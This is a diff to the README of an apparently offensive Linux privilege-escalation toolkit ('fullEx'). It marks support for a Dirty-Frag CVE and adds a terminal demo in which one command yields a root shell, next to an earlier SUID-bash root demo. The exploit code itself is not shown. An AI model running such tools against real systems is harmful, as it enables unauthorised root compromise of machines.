@@ -12,7 +12,7 @@
 | Sudo-Host | CVE-2025-32462 | ✅ |
 | Pack2TheRoot | CVE-2026-41651 | ✅ |
 | Copy-Fail | CVE-2026-31431 | ✅ |
-| Dirty-Frag | CVE-2026-43284 | ❌ |
+| Dirty-Frag | CVE-2026-43284 | ✅ |
 
 ## ⚙️ Outils
 
@@ -258,4 +258,11 @@ user@debian:~/fullEx$ ./fullEx.sh -PKroot
 .suid_bash-5.2# bash -p
 bash-5.2# id
 uid=1000(user) gid=1000(user) euid=0(root) groupes=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev)
+```
+## 💀 Dirty-Frag
+
+```
+user@debian:~/fullEx$ ./fullEx.sh -DirtyFrag
+# id
+uid=0(root) gid=0(root) groups=0(root)
 ```
